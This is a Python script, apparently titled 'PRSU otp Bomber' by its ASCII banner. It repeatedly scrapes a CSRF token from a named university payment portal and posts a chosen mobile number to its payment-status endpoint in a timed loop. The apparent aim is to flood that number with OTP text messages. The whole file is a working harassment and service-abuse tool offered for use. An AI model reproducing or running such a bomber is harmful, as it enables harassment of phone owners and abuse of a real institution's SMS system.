import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
import time

def execute_requests():
    url = "https://online.prsu.ac.in/site/paymentstatuspost"
    base_url = "https://online.prsu.ac.in"
    headers = {
        # Your headers here
    }

    mobile_number = input("Enter your mobile number: ")
    loop_count = int(input("Enter the number of loops to complete: "))
    delay_seconds = int(input("Enter loop delay (in seconds): "))

    session = requests.Session()
    
    progress_bar = tqdm(total=loop_count, ncols=100)

    for i in range(1, loop_count + 1):
        response = session.get(base_url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token_meta = soup.find('meta', {'name': 'csrf-token'})

        if csrf_token_meta:
            csrf_token = csrf_token_meta.get('content', 'CSRF Token Not Found')
        else:
            csrf_token = 'CSRF Token Not Found'

        data = {
            "mobile": mobile_number
        }

        headers["x-csrf-token"] = csrf_token

        response = session.post(url, headers=headers, data=data)

        if i < loop_count:
            time.sleep(delay_seconds)
        
        progress_bar.update(1)
    
    progress_bar.close()
    print(f"{loop_count}/{loop_count} loops are done")

if __name__ == "__main__":
    print(""" _____  _____   _____ _    _         _         
 |  __ \|  __ \ / ____| |  | |       | |        
 | |__) | |__) | (___ | |  | |   ___ | |_ _ __  
 |  ___/|  _  / \___ \| |  | |  / _ \| __| '_ \ 
 | |    | | \ \ ____) | |__| | | (_) | |_| |_) |
 |____  |_|  \_|_____/ \____/   \___/ \__| .__/ 
 |  _ \                | |               | |    
 | |_) | ___  _ __ ___ | |__   ___ _ __  |_|    
 |  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|        
 | |_) | (_) | | | | | | |_) |  __| |           
 |____/ \___/|_| |_| |_|_.__/ \___|_|        
 By rakshas   """)
    execute_requests()
